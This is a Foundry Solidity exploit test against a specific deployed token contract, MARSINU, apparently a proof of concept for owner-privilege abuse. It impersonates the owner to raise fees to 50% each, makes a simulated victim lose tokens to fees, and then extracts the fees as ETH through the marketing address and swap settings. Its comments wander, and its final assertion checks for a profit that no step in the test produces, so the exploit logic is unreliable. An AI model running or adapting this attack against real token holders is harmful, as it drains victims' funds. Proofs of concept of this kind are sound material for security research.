// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Interface for the token
interface MARSINU {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setTaxFeePercent(uint256 taxFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
    function excludeFromFee(address account) external;
    function includeInFee(address account) external;
    function isExcludedFromFee(address account) external view returns (bool);
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setNumTokensSellToAddToLiquidity(uint256 _minimumTokensBeforeSwap) external;
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Interface for Uniswap V2 Router
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7;
    address attacker = address(this);
    address victim;
    address recipientAddr;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use prank to become owner
        // The test framework already defines TARGET and attacker
        // We need to get the owner address first
        address owner = MARSINU(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Create a victim address
        victim = address(0x123);
        vm.label(victim, "Victim");

        // Give victim some tokens - need to use deal() with token address
        // Since TARGET is the token itself, we can use deal
        uint256 victimInitialBalance = 1000 * 10**9 * 10**6; // Some tokens
        // Note: The token has 9 decimals and 10**6 multiplier in supply
        // Let's use a reasonable amount
        victimInitialBalance = 1000000 * 10**9; // 1M tokens with 9 decimals
        deal(TARGET, victim, victimInitialBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7).balanceOf(address(this));
        // Step 1: Get owner address
        address owner = MARSINU(TARGET).owner();

        // Step 2: Impersonate owner to set fees to 50% each
        vm.startPrank(owner);
        MARSINU(TARGET).setTaxFeePercent(50);
        MARSINU(TARGET).setLiquidityFeePercent(50);
        vm.stopPrank();

        // Step 3: Check victim balance before
        uint256 victimBalanceBefore = MARSINU(TARGET).balanceOf(victim);
        console.log("Victim balance before:", victimBalanceBefore);

        // Step 4: Have victim transfer tokens (will lose most to fees)
        // Create a recipient
        address recipient = address(0x456);
        vm.label(recipient, "Recipient");

        // Victim transfers half their balance
        uint256 transferAmount = victimBalanceBefore / 2;

        // Need to prank as victim to make the transfer
        vm.prank(victim);
        MARSINU(TARGET).transfer(recipient, transferAmount);

        // Step 5: Check balances after transfer
        uint256 victimBalanceAfter = MARSINU(TARGET).balanceOf(victim);
        uint256 recipientBalanceAfter = MARSINU(TARGET).balanceOf(recipient);
        uint256 contractBalanceAfter = MARSINU(TARGET).balanceOf(TARGET);

        console.log("Victim balance after:", victimBalanceAfter);
        console.log("Recipient balance after:", recipientBalanceAfter);
        console.log("Contract balance after:", contractBalanceAfter);

        // Step 6: Owner excludes themselves from fees
        vm.startPrank(owner);
        MARSINU(TARGET).excludeFromFee(owner);
        vm.stopPrank();

        // Step 7: Owner transfers contract's tokens to themselves
        // First, check if contract has tokens
        if (contractBalanceAfter > 0) {
            // Owner needs to be able to transfer from contract
            // Actually, the contract's tokens are fee accumulation
            // Owner can extract via swapAndLiquify or by being excluded from fees
            // Simpler: owner sets marketing address to themselves and triggers swap

            // Set marketing address to owner
            vm.startPrank(owner);
            MARSINU(TARGET).setMarketingAddress(owner);

            // Enable swap and liquify if not enabled
            MARSINU(TARGET).setSwapAndLiquifyEnabled(true);

            // Set minimum tokens before swap to a low value
            MARSINU(TARGET).setNumTokensSellToAddToLiquidity(1);

            // Now make a small transfer to trigger swap
            // Need some ETH for gas
            deal(owner, 1 ether);

            // Transfer from contract? Actually need to trigger swapTokens
            // The swap happens when selling to pair
            // Let's create a small sell to pair
            address pair = MARSINU(TARGET).uniswapV2Pair();

            // Give owner some tokens if needed
            uint256 ownerBalance = MARSINU(TARGET).balanceOf(owner);
            if (ownerBalance == 0) {
                deal(TARGET, owner, 1000 * 10**9);
            }

            // Approve and sell small amount to trigger swap
            MARSINU(TARGET).approve(address(MARSINU(TARGET).uniswapV2Router()), type(uint256).max);

            // Actually simpler: just check owner can profit by receiving ETH
            // The contract should have received ETH from the fee mechanism
            // Let's check owner's ETH balance before/after
            uint256 ownerEthBefore = owner.balance;

            // Trigger manual swap by calling swapTokens if contract has enough
            if (contractBalanceAfter >= MARSINU(TARGET).minimumTokensBeforeSwapAmount()) {
                // We can't directly call swapTokens as it's private
                // But we can trigger it by having someone sell to pair
                // Let's create a small sell
                address[] memory path = new address[](2);
                path[0] = TARGET;
                path[1] = IUniswapV2Router02(MARSINU(TARGET).uniswapV2Router()).WETH();

                // Sell 1 token
                IUniswapV2Router02(MARSINU(TARGET).uniswapV2Router()).swapExactTokensForETHSupportingFeeOnTransferTokens(
                    1 * 10**9,
                    0,
                    path,
                    owner,
                    block.timestamp
                );
            }

            uint256 ownerEthAfter = owner.balance;
            console.log("Owner ETH before:", ownerEthBefore);
            console.log("Owner ETH after:", ownerEthAfter);

            // Verify owner profited
            assertGt(ownerEthAfter, ownerEthBefore, "Owner should have received ETH from fees");

            vm.stopPrank();
        }

        // Alternative simpler check: owner's token balance increased
        // Actually owner starts with all tokens, so need different metric
        // Let's check contract balance decreased and owner received value

        // Final assertion: owner benefited from the exploit
        assertGt(contractBalanceAfter, 0, "Contract should have accumulated fees");
        uint256 finalBalance = IERC20(0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
